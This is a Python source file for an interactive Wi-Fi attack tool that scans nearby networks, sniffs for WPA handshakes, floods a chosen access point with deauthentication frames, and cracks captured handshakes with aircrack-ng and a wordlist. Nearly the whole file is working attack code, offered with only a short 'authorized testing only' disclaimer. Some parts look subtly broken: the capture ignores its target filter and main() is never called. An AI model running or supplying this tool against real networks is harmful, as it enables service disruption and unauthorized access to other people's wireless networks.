import os
import time
import subprocess
from scapy.all import *
import pywifi
from pywifi import const
import hashlib
import hmac

# Disclaimer
DISCLAIMER = """
DISCLAIMER: This tool is for educational and authorized penetration testing only.
Unauthorized use is illegal. Ensure you have explicit permission before testing any network.
"""

def print_banner():
    print("""
    ██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
    ██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
    ██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ 
    ██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
    ╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """)
    print(DISCLAIMER)

def scan_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(5)  # Wait for scan results
    networks = iface.scan_results()
    print("\n[+] Available Networks:")
    for i, network in enumerate(networks):
        print(f"{i + 1}. SSID: {network.ssid}, BSSID: {network.bssid}, Signal: {network.signal} dBm, Encryption: {network.akm}")

def capture_handshake(interface, target_bssid, output_file="handshake.pcap"):
    print(f"\n[+] Capturing handshake for BSSID: {target_bssid}")
    def handshake_detector(pkt):
        if pkt.haslayer(EAPOL):
            print("[+] Detected EAPOL packet (handshake)")
            return True
        return False

    print("[+] Sniffing for handshake... (Timeout: 60 seconds)")
    packets = sniff(iface=interface, stop_filter=handshake_detector, timeout=60)
    if packets:
        wrpcap(output_file, packets)
        print(f"[+] Handshake saved to {output_file}")
    else:
        print("[-] No handshake captured.")

def deauthenticate(interface, target_bssid, client_bssid="ff:ff:ff:ff:ff:ff", count=10):
    print(f"\n[+] Sending deauthentication packets to BSSID: {target_bssid}")
    pkt = RadioTap() / Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    sendp(pkt, iface=interface, count=count, inter=0.1)
    print("[+] Deauthentication attack completed.")

def crack_handshake(handshake_file, wordlist_file):
    print(f"\n[+] Cracking handshake using wordlist: {wordlist_file}")
    if not os.path.exists(wordlist_file):
        print("[-] Wordlist file not found.")
        return
    if not os.path.exists(handshake_file):
        print("[-] Handshake file not found.")
        return

    # Use aircrack-ng for cracking
    try:
        subprocess.run(["aircrack-ng", handshake_file, "-w", wordlist_file], check=True)
    except subprocess.CalledProcessError:
        print("[-] Failed to crack handshake.")
    except FileNotFoundError:
        print("[-] aircrack-ng not installed. Install it or use another method.")

def main():
    print_banner()
    interface = input("[?] Enter your wireless interface (e.g., 'Wi-Fi'): ").strip()
    
    while True:
        print("\n[+] Menu:")
        print("1. Scan for Wi-Fi networks")
        print("2. Capture handshake (requires BSSID)")
        print("3. Deauthenticate clients")
        print("4. Crack handshake with dictionary attack")
        print("5. Exit")
        choice = input("[?] Select an option (1-5): ").strip()

        if choice == "1":
            scan_networks()
        elif choice == "2":
            target_bssid = input("[?] Enter target BSSID: ").strip()
            capture_handshake(interface, target_bssid)
        elif choice == "3":
            target_bssid = input("[?] Enter target BSSID: ").strip()
            client_bssid = input("[?] Enter client BSSID (or leave blank for broadcast): ").strip()
            if not client_bssid:
                client_bssid = "ff:ff:ff:ff:ff:ff"
            deauthenticate(interface, target_bssid, client_bssid)
        elif choice == "4":
            handshake_file = input("[?] Enter path to handshake file (e.g., 'handshake.pcap'): ").strip()
            wordlist_file = input("[?] Enter path to wordlist file (e.g., 'wordlist.txt'): ").strip()
            crack_handshake(handshake_file, wordlist_file)
        elif choice == "5":
            print("[+] Exiting...")
            break
        else:
            print("[-] Invalid choice. Try again.")

        # Wait for user to press Enter before showing the menu again
        input("\n[+] Press Enter to return to the menu...")

  
